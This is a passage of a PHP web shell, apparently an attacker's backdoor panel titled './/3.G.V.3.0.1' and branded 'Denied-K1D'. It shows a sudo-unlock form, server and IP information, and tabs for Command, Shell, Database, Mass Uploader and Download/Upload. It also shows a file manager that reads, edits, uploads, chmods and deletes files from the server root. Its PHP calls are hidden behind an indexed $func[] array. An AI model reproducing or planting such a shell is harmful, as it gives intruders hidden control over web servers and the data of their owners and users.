                <input type="password" name="sudo_password" placeholder="Sudo Password..." autofocus>
                <button type="submit">UNLOCK</button>
            </form>
            <button onclick="window.location.href='?dir=<?= urlencode($path) ?>'">CANCEL</button>
        </div>
    </body>
    </html>
    <?php
    exit;
}


function showAccessDenied($message) {
    ?>
    <!DOCTYPE html>
    <html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
        <link rel="icon" type="image/png" href="https://i.ibb.co/fV54hCPt/300.png?v=4">
        <link rel="shortcut icon" type="image/png" href="https://i.ibb.co/fV54hCPt/300.png?v=4">
        <link rel="apple-touch-icon" href="https://i.ibb.co/fV54hCPt/300.png?v=4">
        <title>Access Denied</title>
        <style>
            body { 
                background: #1a1a1a; 
                color: #ff4444; 
                font-family: 'Courier New', monospace;
                display: flex;
                justify-content: center;
                align-items: center;
                height: 100vh;
                margin: 0;
            }
            .message {
                text-align: center;
                padding: 20px;
                border: 2px solid #ff4444;
                border-radius: 10px;
                background: #2d2d2d;
            }
        </style>
    </head>
    <body>
        <div class="message">
            <h2>Denied-K1D</h2>
            <p><?= htmlspecialchars($message) ?></p>
            <p>Redirecting to home...</p>
        </div>
        <script>
            setTimeout(function() {
                window.location.href = '<?= $_SERVER['PHP_SELF'] ?>';
            }, 2000);
        </script>
    </body>
    </html>
    <?php
    exit;
}



?>


<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css">
        <link rel="icon" type="image/png" href="https://i.ibb.co/fV54hCPt/300.png?v=4">
        <link rel="shortcut icon" type="image/png" href="https://i.ibb.co/fV54hCPt/300.png?v=4">
        <link rel="apple-touch-icon" href="https://i.ibb.co/fV54hCPt/300.png?v=4">
    <title>.//3.G.V.3.0.1</title>
    <style>
    /* Base Styles */
    body { 
        background-color: #1a1a1a; 
        color: #e0e0e0;
        font-size: 14px;
        overflow-x: hidden;
    }
    .box { 
        background-color: #2d2d2d; 
        border: 1px solid #444;
        border-radius: 10px;
        padding: 15px;
    }
    
    /* Better mobile spacing */
    .container-fluid {
        padding-left: 10px;
        padding-right: 10px;
    }
    
    /* Responsive Breadcrumb */
    .breadcrumb { 
        background-color: #333; 
        padding: 10px 12px; 
        border-radius: 8px;
        font-size: 13px;
        overflow-x: auto;
        white-space: nowrap;
        -webkit-overflow-scrolling: touch;
        scrollbar-width: thin;
        display: flex;
        flex-wrap: nowrap;
    }
    .breadcrumb::-webkit-scrollbar {
        height: 4px;
    }
    .breadcrumb::-webkit-scrollbar-thumb {
        background: #666;
        border-radius: 4px;
    }
    
    /* Pre tags */
    pre { 
        background-color: #252525; 
        color: #e0e0e0; 
        padding: 1rem; 
        border-radius: 8px; 
        white-space: pre-wrap; 
        word-wrap: break-word;
        font-size: 13px;
        max-height: 400px;
        overflow: auto;
    }
    
    /* Tabs - Mobile friendly */
    .nav-tabs {
        display: flex;
        flex-wrap: nowrap;
        overflow-x: auto;
        -webkit-overflow-scrolling: touch;
        scrollbar-width: thin;
        padding-bottom: 2px;
        gap: 2px;
    }
    .nav-tabs::-webkit-scrollbar {
        height: 3px;
    }
    .nav-tabs .nav-link {
        color: #aaa;
        padding: 8px 12px;
        font-size: 13px;
        white-space: nowrap;
        border: 1px solid transparent;
        border-radius: 6px 6px 0 0;
    }
    .nav-tabs .nav-link.active { 
        color: #fff; 
        background-color: #333; 
        border-color: #444;
    }
    .tab-content { 
        background-color: #333; 
        border: 1px solid #444; 
        border-top: none; 
        padding: 15px;
        border-radius: 0 0 8px 8px;
    }
    
    /* Form Controls */
    .form-control, .form-control:focus { 
        background-color: #333; 
        color: #fff; 
        border-color: #444;
        font-size: 14px;
    }
    .form-control-sm {
        font-size: 13px;
        padding: 6px 10px;
    }
    
    /* Buttons */
    .btn-outline-light:hover { 
        background-color: #444; 
    }
    .btn-sm {
        padding: 5px 10px;
        font-size: 12px;
    }
    .btn-group-sm > .btn {
        padding: 4px 8px;
        font-size: 11px;
    }
    
    /* Logout button - positioned better on mobile */
    .logout-btn { 
        position: fixed; 
        top: 15px; 
        right: 15px; 
        z-index: 1000;
        box-shadow: 0 2px 5px rgba(0,0,0,0.3);
    }
    
    /* Card hover effects - disable on mobile for better performance */
    .card {
        border: 1px solid #444;
        transition: all 0.2s ease;
    }
    @media (hover: hover) {
        .card:hover {
            transform: scale(1.02);
            z-index: 10;
            box-shadow: 0 0 15px rgba(255,255,255,0.1);
        }
    }
    
    /* Table - make it scrollable horizontally on mobile */
    .table-responsive {
        border-radius: 8px;
        margin-bottom: 1rem;
        overflow-x: auto;
        -webkit-overflow-scrolling: touch;
    }
    .table {
        min-width: 800px; /* Ensures table doesn't squish on mobile */
        margin-bottom: 0;
    }
    .table-dark { 
        background-color: #252525; 
    }
    .table-hover tbody tr:hover { 
        background-color: #3a3a3a; 
    }
    .table th, .table td {
        padding: 8px 6px;
        vertical-align: middle;
        font-size: 13px;
    }
    
    /* Badges */
    .badge {
        font-size: 11px;
        padding: 3px 6px;
    }
    
    /* Grid view cards - responsive */
    .row-cols-2 > * {
        padding: 5px;
    }
    @media (min-width: 576px) {
        .row-cols-sm-3 > * { padding: 6px; }
    }
    @media (min-width: 768px) {
        .row-cols-md-4 > * { padding: 8px; }
    }
    @media (min-width: 992px) {
        .row-cols-lg-6 > * { padding: 10px; }
    }
    
    /* Card styles for grid view */
    .card.bg-dark {
        border-radius: 8px;
        margin-bottom: 0;
    }
    .card-body {
        padding: 12px 6px;
    }
    .card-body .fa-3x {
        font-size: 2.5rem;
    }
    
    /* Info cards */
    .card-body.bg-dark {
        border-radius: 8px;
    }
    
    /* Action buttons group - stack on mobile */
    .btn-group {
        flex-wrap: wrap;
        gap: 2px;
    }
    .btn-group .btn {
        border-radius: 4px !important;
        margin: 1px;
    }
    
    /* File info table - better mobile view */
    .table-sm th, .table-sm td {
        padding: 6px 8px;
    }
    
    /* Mobile optimizations */
    @media (max-width: 768px) {
        body {
            font-size: 13px;
        }
        .box {
            padding: 10px;
        }
        h1 {
            font-size: 1.8rem;
        }
        .logout-btn {
            top: 10px;
            right: 10px;
            padding: 4px 8px;
            font-size: 11px;
        }
        .info {
            margin-top: 30px; /* Space for fixed logout button */
        }
        .btn-group .btn {
            padding: 4px 8px;
            font-size: 11px;
        }
        .breadcrumb {
            font-size: 12px;
            padding: 8px 10px;
        }
    }
    
    /* Very small screens */
    @media (max-width: 480px) {
        .btn-group .btn {
            width: 100%;
            margin: 2px 0;
        }
        .row-cols-2 > * {
            flex: 0 0 50%;
            max-width: 50%;
        }
    }
    
    /* Smooth scrolling */
    * {
        -webkit-overflow-scrolling: touch;
    }
    
    /* File icons */
    .fa-file-image { color: #5bc0de; }
    .fa-file-code { color: #5cb85c; }
    .fa-file-alt { color: #aaa; }
    .fa-file-archive { color: #f0ad4e; }
    .fa-file-audio { color: #5bc0de; }
    .fa-file-video { color: #d9534f; }
    .fa-file-pdf { color: #d9534f; }
    .fa-file-word { color: #5bc0de; }
    .fa-file-excel { color: #5cb85c; }
    .fa-file-powerpoint { color: #f0ad4e; }
    
    /* Progress bars */
    .progress {
        background-color: #444;
        border-radius: 4px;
    }
    .progress-bar {
        border-radius: 4px;
    }
    
    /* Alerts */
    .alert-info {
        background-color: #1e4b5c;
        color: #fff;
        border-color: #145c6e;
        font-size: 13px;
        padding: 8px 12px;
    }
    .alert-sm {
        padding: 6px 10px;
    }
    
    /* Search suggestions */
    .suggestion-item {
        padding: 8px 10px;
        border-bottom: 1px solid #444;
        cursor: pointer;
        font-size: 13px;
        transition: background 0.2s;
    }
    .suggestion-item:hover {
        background-color: #444;
    }
    .suggestion-item:last-child {
        border-bottom: none;
    }
    
    /* Collapse sections */
    .collapse .card-body {
        padding: 15px;
    }
    
    /* Quick actions */
    .w-100.mb-2 {
        margin-bottom: 6px !important;
    }
    
    /* Text truncation */
    .text-truncate {
        max-width: 100%;
        overflow: hidden;
        text-overflow: ellipsis;
    }
</style>
</head>
<body class="bg-dark">
    <div class="container-fluid py-3 position-relative">
        <a href="?logout=1" class="btn btn-outline-danger btn-sm logout-btn" onclick="return confirm('Are you sure you want to logout?')">
            <i class="fa fa-sign-out"></i> Logout
        </a>
        <div class="box shadow p-4 rounded-3">
            <div class="info mb-3">
                <!-- Profile Circle Inline with Title - MOBILE FRIENDLY -->
                <div class="d-flex flex-column flex-sm-row align-items-center justify-content-center mb-2" style="gap: 15px;">
                    <!-- Profile Circle -->
                    <a href="https://github.com/" target="_blank" style="text-decoration: none; display: block;">
                        <div id="profile-circle" style="width: 70px; height: 70px; border-radius: 50%; overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.5); border: 3px solid #00ff88; cursor: pointer; transition: all 0.3s ease-in-out; margin: 0 auto;"
                             onmouseover="changeColor(this)"
                             onmouseout="this.style.borderColor='#00ff88'; this.style.transform='scale(1)'; this.style.boxShadow='0 4px 15px rgba(0,0,0,0.5)';">
                            <img src="https://i.ibb.co/fV54hCPt/300.png?v=4" 
                                 alt="REDUCTED" 
                                 style="width: 100%; height: 100%; object-fit: cover;">
                        </div>
                    </a>

                    <!-- Title - responsive font size -->
                    <h1 style="color:white; margin: 0; line-height: 1.2; font-size: clamp(1.8rem, 5vw, 2.5rem); text-align: center;">.//3.G.V.3.0.1 </h1>
                </div>

                <!-- Server Info (centered below) -->
                <div class="text-center mt-3" style="font-size: clamp(12px, 3vw, 14px);">
                    <div style="display: flex; flex-wrap: wrap; justify-content: center; gap: 10px 15px; margin-bottom: 5px;">
                        <span><i class="fa fa-user"></i>&ensp;<?= isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? htmlspecialchars($_SERVER['HTTP_X_FORWARDED_FOR']) : (isset($_SERVER['REMOTE_ADDR']) ? htmlspecialchars($_SERVER['REMOTE_ADDR']) : 'Unknown') ?></span>
                        <span><i class="fa fa-server"></i>&ensp;<?= $func[0]() ?></span>
                    </div>
                    <div style="display: flex; flex-wrap: wrap; justify-content: center; gap: 10px 15px;">
                        <span><i class="fa fa-microchip"></i>&ensp;<?= $_SERVER['SERVER_SOFTWARE'] ?></span>
                        <span><i class="fa fa-satellite-dish"></i>&ensp;<?= !@$_SERVER['SERVER_ADDR'] ? $func[19]($_SERVER['SERVER_NAME']) : @$_SERVER['SERVER_ADDR'] ?></span>
                    </div>
                </div>

                <!-- JavaScript for random color on hover -->
                <script>
                function changeColor(element) {
                    const colors = [
                        '#00ff88', '#ff00ff', '#00ffff', '#ffff00', 
                        '#ff6600', '#ff0000', '#9900ff', '#0099ff',
                        '#ff0099', '#00ff99', '#ffcc00', '#ff3366'
                    ];
                    const randomColor = colors[Math.floor(Math.random() * colors.length)];
                    element.style.borderColor = randomColor;
                    element.style.transform = 'scale(1.05)';
                    element.style.boxShadow = '0 6px 20px rgba(0,0,0,0.7)';
                }
                </script>
            </div>
            
            
            <ul class="nav nav-tabs mb-3" id="shellTabs" role="tablist">
                <li class="nav-item" role="presentation">
                    <button class="nav-link active" id="file-tab" data-bs-toggle="tab" data-bs-target="#file" type="button" role="tab">File Manager</button>
                </li>
                <li class="nav-item" role="presentation">
                    <button class="nav-link" id="command-tab" data-bs-toggle="tab" data-bs-target="#command" type="button" role="tab">Command</button>
                </li>
                <li class="nav-item" role="presentation">
                    <button class="nav-link" id="database-tab" data-bs-toggle="tab" data-bs-target="#database" type="button" role="tab">Database</button>
                </li>
                <li class="nav-item" role="presentation">
                    <button class="nav-link" id="shell-tab" data-bs-toggle="tab" data-bs-target="#shell" type="button" role="tab">Shell</button>
                </li>
                <li class="nav-item" role="presentation">
                    <button class="nav-link" id="download-tab" data-bs-toggle="tab" data-bs-target="#download" type="button" role="tab">Download/Upload</button>
                </li>
                <li class="nav-item" role="presentation">
                    <button class="nav-link" id="massupload-tab" data-bs-toggle="tab" data-bs-target="#massupload" type="button" role="tab">Mass Uploader</button>
                </li>
                <li class="nav-item" role="presentation">
                    <button class="nav-link" id="info-tab" data-bs-toggle="tab" data-bs-target="#info" type="button" role="tab">System Info</button>
                </li>
            </ul>
            
            <div class="tab-content" id="shellTabsContent">
                <!-- File Manager Tab -->
                <div class="tab-pane fade show active" id="file" role="tabpanel">
                    <!-- Breadcrumb Navigation -->
                    <div class="breadcrumb mb-3 d-flex align-items-center">
                        <i class="fa fa-folder-open me-2"></i>
                        <?php foreach ($exdir as $id => $pat) : 
                            if ($pat == '' && $id == 0):
                        ?>
                        <a href="?dir=/" class="text-decoration-none text-light">🌐 Root</a>
                        <?php endif; if ($pat == '') continue; ?>
                        <?php if ($id + 1 == count($exdir)) : ?>
                        <span class="text-secondary mx-1">/ <?= htmlspecialchars($pat) ?></span>
                        <?php else : ?>
                        <a href="?dir=<?php
                            for ($i = 0; $i <= $id; $i++) {
                                echo urlencode($exdir[$i]);
                                if ($i != $id) echo "/";
                            }
                        ?>" class="text-decoration-none text-light mx-1"><?= htmlspecialchars($pat) ?></a>
                        <span class="text-light">/</span>
                        <?php endif; ?>
                        <?php endforeach; ?>
                        <a href="?" class="text-decoration-none text-light ms-2">🏠 Home</a>
                    </div>
                    
                    <!-- Action Buttons -->
                    <div class="row mb-3">
                        <div class="col-md-8">
                            <div class="btn-group flex-wrap" role="group">
                                <button class="btn btn-outline-light btn-sm" data-bs-toggle="collapse" href="#newFolderCollapse">
                                    <i class="fa fa-folder-plus"></i> New Folder
                                </button>
                                <button class="btn btn-outline-light btn-sm" data-bs-toggle="collapse" href="#newFileCollapse">
                                    <i class="fa fa-file-plus"></i> New File
                                </button>
                                <button class="btn btn-outline-light btn-sm" data-bs-toggle="collapse" href="#uploadCollapse">
                                    <i class="fa fa-upload"></i> Upload
                                </button>
                                <button class="btn btn-outline-light btn-sm" data-bs-toggle="collapse" href="#searchCollapse">
                                    <i class="fa fa-search"></i> Search
                                </button>
                            </div>
                        </div>
                        <div class="col-md-4">
                            <div class="text-end text-muted small">
                            <i class="fa fa-folder"></i> Folders: <?php 
                                $folder_count = 0;
                                $file_count = 0;
                                foreach ($dirs as $item) {
                                    if ($item != '.' && $item != '..') {
                                        if (is_dir($path . '/' . $item)) {
                                            $folder_count++;
                                        } else {
                                            $file_count++;
                                        }
                                    }
                                }
                                echo $folder_count;
                            ?> |
                            <i class="fa fa-file"></i> Files: <?= $file_count ?>
                        </div>
                        </div>
                    </div>
                    
                    <!-- Collapsible Sections -->
                    <div class="collapse mb-3" id="newFolderCollapse">
                        <div class="card card-body bg-dark">
                            <form action="" method="post">
                                <div class="mb-3">
                                    <label class="form-label">Folder Name</label>
                                    <input type="text" class="form-control form-control-sm" name="newFolderName" placeholder="NewFolder" required>
                                </div>
                                <button type="submit" class="btn btn-outline-light btn-sm">Create Folder</button>
                            </form>
                        </div>
                    </div>
                    
                    <div class="collapse mb-3" id="newFileCollapse">
                        <div class="card card-body bg-dark">
                            <form action="" method="post">
                                <div class="mb-3">
                                    <label class="form-label">File Name</label>
                                    <input type="text" class="form-control form-control-sm" name="newFileName" placeholder=".//3.G.V.3.0.1 .php" required>
                                </div>
                                <div class="mb-3">
                                    <label class="form-label">Content</label>
                                    <textarea name="newFileContent" rows="8" class="form-control form-control-sm" placeholder="File content..."></textarea>
                                </div>
                                <button type="submit" class="btn btn-outline-light btn-sm">Create File</button>
                            </form>
                        </div>
                    </div>
                    
                    <div class="collapse mb-3" id="uploadCollapse">
                        <div class="card card-body bg-dark">
                            <form action="" method="post" enctype="multipart/form-data">
                                <div class="mb-3">
                                    <label class="form-label">Select Files (Multiple allowed)</label>
                                    <input type="file" class="form-control form-control-sm" name="uploadfile[]" multiple required>
                                </div>
                                <button type="submit" class="btn btn-outline-light btn-sm">Upload Files</button>
                            </form>
                        </div>
                    </div>
                    
                    <div class="collapse mb-3" id="searchCollapse">
                        <div class="card card-body bg-dark">
                            <form action="" method="get" id="searchForm">
                            <?php
                            // Store the raw path for the form
                            $form_path = isset($_GET['dir']) ? $_GET['dir'] : $path;
                            // If it's already encoded, keep it as is
                            if (strpos($form_path, '%2F') !== false) {
                                $form_path = $form_path; // Keep as is
                            } else {
                                $form_path = urlencode($path);
                            }
                            ?>
                            <input type="hidden" name="dir" value="<?= htmlspecialchars($form_path) ?>">
                                <div class="input-group input-group-sm">
                                    <input type="text" class="form-control form-control-sm" id="searchInput" name="search" placeholder="Search files/folders..." value="<?= isset($_GET['search']) ? htmlspecialchars(urldecode($_GET['search'])) : '' ?>" autocomplete="off">
                                    <button type="submit" class="btn btn-outline-light"><i class="fa fa-search"></i></button>
                                    <?php if (isset($_GET['search']) && !empty($_GET['search'])): ?>
                                    <a href="?dir=<?= urlencode($path) ?>" class="btn btn-outline-light">Clear</a>
                                    <?php endif; ?>
                                </div>
                                <div class="mt-2 small text-muted">
                                    <i class="fa fa-info-circle"></i> Searching in: <?= htmlspecialchars(urldecode($path)) ?>
                                </div>
                                    
                                <!-- Live search suggestions -->
                                <div id="searchSuggestions" class="mt-2" style="display: none;">
                                    <div class="card bg-dark border-secondary">
                                        <div class="card-body p-2">
                                            <small class="text-muted">Suggestions:</small>
                                            <div id="suggestionsList" class="mt-1"></div>
                                        </div>
                                    </div>
                                </div>
                            </form>
                        </div>
                    </div>
                    
                    <!-- Search Results Info -->
                    <?php if (isset($_GET['search']) && !empty($_GET['search'])): ?>
                    <?php
                        $search_term_raw = $_GET['search'];
                        $search_term = strtolower(urldecode($search_term_raw));
                    
                        // Count all items that match the search (excluding . and ..)
                        $matching_items = array();
                        $all_files_list = array();
                    
                        foreach ($dirs as $item) {
                            if ($item != '.' && $item != '..') {
                                $all_files_list[] = $item;
                                $item_lower = strtolower($item);
                            
                                // Check if search term is contained in the filename
                                if (strpos($item_lower, $search_term) !== false) {
                                    $matching_items[] = $item;
                                }
                            }
                        }
                    
                        $filtered_count = count($matching_items);
                    
                        // Store matching items for JavaScript suggestions
                        $suggestions_json = json_encode($all_files_list);
                    ?>
                    <div class="alert alert-info alert-sm py-1 mb-2">
                        <i class="fa fa-search"></i> 
                        Search results for "<strong><?= htmlspecialchars(urldecode($search_term_raw)) ?></strong>" - 
                        <?= $filtered_count ?> item(s) found
                        <?php if ($filtered_count > 0): ?>
                            <button class="btn btn-xs btn-outline-light float-end" onclick="document.getElementById('searchInput').value = ''; window.location.href='?dir=<?= urlencode($path) ?>'">Clear Search</button>
                        <?php endif; ?>
                    </div>
                    <?php endif; ?>
                        
                    <!-- Live Search Suggestions Script -->
                    <script>
                    // Live search suggestions
                    document.addEventListener('DOMContentLoaded', function() {
                        const searchInput = document.getElementById('searchInput');
                        const suggestionsDiv = document.getElementById('searchSuggestions');
                        const suggestionsList = document.getElementById('suggestionsList');

                        if (searchInput) {
                            // Get all files from the directory
                            const allFiles = <?= json_encode(array_values(array_filter($dirs, function($item) {
                                return $item != '.' && $item != '..';
                            }))) ?>;

                            searchInput.addEventListener('input', function() {
                                const query = this.value.toLowerCase().trim();

                                if (query.length < 1) {
                                    suggestionsDiv.style.display = 'none';
                                    return;
                                }

                                // Filter files that match the query
                                const matches = allFiles.filter(file => 
                                    file.toLowerCase().includes(query)
                                ).slice(0, 10);

                                if (matches.length > 0) {
                                    suggestionsList.innerHTML = matches.map(file => 
                                        `<div class="suggestion-item p-1" style="cursor: pointer; border-bottom: 1px solid #444;" onclick="window.location.href='?dir=<?= urlencode($path) ?>&search=${encodeURIComponent(file)}'">
                                            <i class="fa fa-file text-muted me-2"></i>${file}
                                        </div>`
                                    ).join('');
                                    suggestionsDiv.style.display = 'block';
                                } else {
                                    suggestionsDiv.style.display = 'none';
                                }
                            });

                            // Hide suggestions when clicking outside
                            document.addEventListener('click', function(e) {
                                if (!searchInput.contains(e.target) && !suggestionsDiv.contains(e.target)) {
                                    suggestionsDiv.style.display = 'none';
                                }
                            });
                        }
                    });
                    </script>

                    <style>
                    .suggestion-item:hover {
                        background-color: #444;
                        border-radius: 3px;
                    }
                    .suggestion-item:last-child {
                        border-bottom: none !important;
                    }
                    </style>
                    
                    <!-- Action Forms (Rename, Edit, Chmod) -->
                    <?php if (isset($_GET['action'])) : ?>
                    <div class="card card-body bg-dark mb-3">
                        <?php if ($_GET['action'] == 'rename' && isset($_GET['item'])) : ?>
                        <form action="" method="post">
                            <div class="mb-3">
                                <label class="form-label">Rename: <?= htmlspecialchars($_GET['item']) ?></label>
                                <input type="text" class="form-control form-control-sm" name="newName" value="<?= htmlspecialchars($_GET['item']) ?>" required>
                            </div>
                            <button type="submit" class="btn btn-outline-light btn-sm">Rename</button>
                            <a href="?dir=<?= urlencode($path) ?><?= isset($_GET['search']) ? '&search=' . urlencode($_GET['search']) : '' ?>" class="btn btn-outline-light btn-sm">Cancel</a>
                        </form>
                        
                        <?php elseif ($_GET['action'] == 'edit' && isset($_GET['item'])) : ?>
                        <?php 
                            $file_content = $func[5]($path. '/'. $_GET['item']);
                        ?>
                        <form action="" method="post">
                            <div class="mb-3">
                                <label class="form-label">Editing: <?= htmlspecialchars($_GET['item']) ?></label>
                                <textarea id="CopyFromTextArea" name="newContent" rows="15" class="form-control form-control-sm font-monospace"><?= htmlspecialchars($file_content) ?></textarea>
                            </div>
                            <button type="submit" class="btn btn-outline-light btn-sm">Save</button>
                            <button type="button" class="btn btn-outline-light btn-sm" onclick="jscopy()">Copy</button>
                            <a href="?dir=<?= urlencode($path) ?><?= isset($_GET['search']) ? '&search=' . urlencode($_GET['search']) : '' ?>" class="btn btn-outline-light btn-sm">Cancel</a>
                        </form>
                        
                        <?php elseif ($_GET['action'] == 'view' && isset($_GET['item'])) : ?>
                        <?php 
                            $file_content = $func[5]($path. '/'. $_GET['item']);
                            $file_ext = pathinfo($_GET['item'], PATHINFO_EXTENSION);
                            $is_image = in_array(strtolower($file_ext), ['jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp']);
                            $is_text = in_array(strtolower($file_ext), ['txt', 'php', 'html', 'htm', 'css', 'js', 'json', 'xml', 'ini', 'conf', 'log', 'md', 'py', 'sh']);
                        ?>
                        <div class="mb-3">
                            <div class="d-flex justify-content-between mb-2">
                                <label class="form-label">Viewing: <?= htmlspecialchars($_GET['item']) ?> (<?= fsize($path . '/' . $_GET['item']) ?>)</label>
                                <div>
                                    <a href="?dir=<?= urlencode($path) ?>&item=<?= urlencode($_GET['item']) ?>&action=edit<?= isset($_GET['search']) ? '&search=' . urlencode($_GET['search']) : '' ?>" class="btn btn-outline-light btn-sm">Edit</a>
                                    <a href="?dir=<?= urlencode($path) ?>&download=1&item=<?= urlencode($_GET['item']) ?>" class="btn btn-outline-light btn-sm">Download</a>
                                    <a href="?dir=<?= urlencode($path) ?><?= isset($_GET['search']) ? '&search=' . urlencode($_GET['search']) : '' ?>" class="btn btn-outline-light btn-sm">Back</a>
                                </div>
                            </div>
                            
                            <?php if ($is_image): ?>
                                <div class="text-center">
                                    <img src="data:image/<?= $file_ext ?>;base64,<?= base64_encode($file_content) ?>" class="img-fluid" style="max-height: 500px;" alt="<?= htmlspecialchars($_GET['item']) ?>">
                                </div>
                            <?php elseif ($is_text): ?>
                                <pre class="bg-dark text-light p-3 rounded" style="max-height: 500px; overflow: auto;"><code><?= htmlspecialchars($file_content) ?></code></pre>
                            <?php else: ?>
                                <textarea readonly rows="15" class="form-control form-control-sm font-monospace"><?= htmlspecialchars($file_content) ?></textarea>
                            <?php endif; ?>
                        </div>
                        
                        <?php elseif ($_GET['action'] == 'chmod' && isset($_GET['item'])) : ?>
                        <form action="" method="post">
                            <div class="mb-3">
                                <label class="form-label">Change Permissions: <?= htmlspecialchars($_GET['item']) ?></label>
                                <div class="input-group input-group-sm">
                                    <input type="text" class="form-control form-control-sm" name="newPerm" value="<?= $func[11]($func[10]('%o', $func[6]($_GET['item'])), -4); ?>" required>
                                    <span class="input-group-text bg-dark text-light">Current: <?= $func[11]($func[10]('%o', $func[6]($_GET['item'])), -4); ?></span>
                                </div>
                                <small class="text-muted">Enter 3-digit octal (e.g., 755, 644, 777)</small>
                            </div>
                            <button type="submit" class="btn btn-outline-light btn-sm">Change</button>
                            <a href="?dir=<?= urlencode($path) ?><?= isset($_GET['search']) ? '&search=' . urlencode($_GET['search']) : '' ?>" class="btn btn-outline-light btn-sm">Cancel</a>
                        </form>
                        
                        <?php elseif ($_GET['action'] == 'info' && isset($_GET['item'])) : ?>
                        <?php
                            $item_path = $path . '/' . $_GET['item'];
                            $is_dir = is_dir($item_path);
                            $stat = stat($item_path);
                        ?>
                        <div class="mb-3">
                            <label class="form-label">File Info: <?= htmlspecialchars($_GET['item']) ?></label>
                            <table class="table table-dark table-sm table-bordered">
                                <tr><th width="30%">Full Path</th><td><?= htmlspecialchars($item_path) ?></td></tr>
                                <tr><th>Type</th><td><?= $is_dir ? 'Directory' : 'File' ?></td></tr>
                                <tr><th>Size</th><td><?= $is_dir ? '-' : fsize($item_path) ?></td></tr>
                                <tr><th>Permissions</th><td><?= $func[11]($func[10]('%o', $func[6]($_GET['item'])), -4); ?></td></tr>
                                <tr><th>Owner/Group</th><td><?= htmlspecialchars($func[35]($item_path)) ?></td></tr>
                                <tr><th>Created</th><td><?= date('Y-m-d H:i:s', $stat['ctime']) ?></td></tr>
                                <tr><th>Modified</th><td><?= date('Y-m-d H:i:s', $stat['mtime']) ?></td></tr>
                                <tr><th>Accessed</th><td><?= date('Y-m-d H:i:s', $stat['atime']) ?></td></tr>
                                <tr><th>Inode</th><td><?= $stat['ino'] ?></td></tr>
                                <tr><th>Device</th><td><?= $stat['dev'] ?></td></tr>
                            </table>
                            <a href="?dir=<?= urlencode($path) ?><?= isset($_GET['search']) ? '&search=' . urlencode($_GET['search']) : '' ?>" class="btn btn-outline-light btn-sm">Back</a>
                        </div>
                        <?php endif; ?>
                    </div>
                    <?php endif; ?>
                    
                    <!-- File Manager Table View -->
                    <?php
                    // Get all items excluding . and ..
                    $all_items = array();
                    foreach ($dirs as $item) {
                        if ($item != '.' && $item != '..') {
                            $all_items[] = $item;
                        }
                    }

                    // Filter by search if set
                    $display_items = $all_items;
                    if (isset($_GET['search']) && !empty($_GET['search'])) {
                        $search_term = strtolower(urldecode($_GET['search']));
                        $display_items = array();
                        foreach ($all_items as $item) {
                            if (strpos(strtolower($item), $search_term) !== false) {
                                $display_items[] = $item;
                            }
                        }
                    }

                    // Separate folders and files for display
                    $display_folders = array();
                    $display_files = array();

                    foreach ($display_items as $item) {
                        $full_path = $path . '/' . $item;
                        if (is_dir($full_path)) {
                            $display_folders[] = $item;
                        } else {
                            $display_files[] = $item;
                        }
                    }

                    // Sort alphabetically
                    sort($display_folders);
                    sort($display_files);
                    ?>
                    
                    <!-- Table View -->
                    <div class="table-responsive">
                        <table class="table table-hover table-dark table-sm">
                            <thead>
                                <tr>
                                    <th>Name</th>
                                    <th>Type</th>
                                    <th>Size</th>
                                    <th>Owner/Group</th>
                                    <th>Permissions</th>
                                    <th>Modified</th>
                                    <th>Actions</th>
                                </tr>
                            </thead>
                            <tbody>
                                <!-- Parent directory link (only show if not searching) -->
                                <?php if (!isset($_GET['search']) && is_dir($path . '/..') && $path != '/'): ?>
                                <tr>
                                    <td>
                                        <a href="?dir=<?= urlencode(dirname($path)) ?>" class="text-decoration-none text-light">
                                            <i class="fa fa-level-up-alt"></i> <strong>.. (Parent)</strong>
                                        </a>
                                    </br>
                                    <td>directory</br>
                                    <td>-</br>
                                    <td>-</br>
                                    <td>-</br>
                                    <td>-</br>
                                    <td>
                                        <a href="?dir=<?= urlencode(dirname($path)) ?>" class="btn btn-outline-light btn-sm">Go</a>
                                    </br>
                                </tr>
                                <?php endif; ?>
                                
                                <!-- Folders -->
                                <?php foreach ($display_folders as $dir): ?>
                                <tr>
                                    <td>
                                        <a href="?dir=<?= urlencode($path . '/' . $dir) ?><?= isset($_GET['search']) ? '&search=' . urlencode($_GET['search']) : '' ?>" class="text-decoration-none text-light">
                                            <i class="fa fa-folder text-warning"></i> <?= htmlspecialchars($dir) ?>
                                        </a>
                                    </br>
                                    <td>📁 Directory</br>
                                    <td>-</br>
                                    <td><?= htmlspecialchars($func[35]($path . '/' . $dir)) ?></br>
                                    <td>
                                        <span class="badge bg-secondary"><?= $func[11]($func[10]('%o', $func[6]($path . '/' . $dir)), -4); ?></span>
                                    </br>
                                    <td><?= $func[23]("Y-m-d H:i", $func[7]($path . '/' . $dir)); ?></br>
                                    <td>
                                        <div class="btn-group btn-group-sm">
                                            <a href="?dir=<?= urlencode($path) ?>&item=<?= urlencode($dir) ?>&action=rename<?= isset($_GET['search']) ? '&search=' . urlencode($_GET['search']) : '' ?>" class="btn btn-outline-light" title="Rename">
                                                <i class="fa fa-edit"></i>
                                            </a>
                                            <a href="?dir=<?= urlencode($path) ?>&item=<?= urlencode($dir) ?>&action=chmod<?= isset($_GET['search']) ? '&search=' . urlencode($_GET['search']) : '' ?>" class="btn btn-outline-light" title="Permissions">
                                                <i class="fa fa-key"></i>
                                            </a>
                                            <a href="?dir=<?= urlencode($path) ?>&item=<?= urlencode($dir) ?>&action=info<?= isset($_GET['search']) ? '&search=' . urlencode($_GET['search']) : '' ?>" class="btn btn-outline-light" title="Info">
                                                <i class="fa fa-info-circle"></i>
                                            </a>
                                            <a href="?dir=<?= urlencode($path) ?>&item=<?= urlencode($path . '/' . $dir) ?>&action=delete<?= isset($_GET['search']) ? '&search=' . urlencode($_GET['search']) : '' ?>" class="btn btn-outline-light" onclick="return confirm('Delete folder \'<?= htmlspecialchars($dir) ?>\' and all contents?')" title="Delete">
                                                <i class="fa fa-trash"></i>
                                            </a>
                                        </div>
                                    </br>
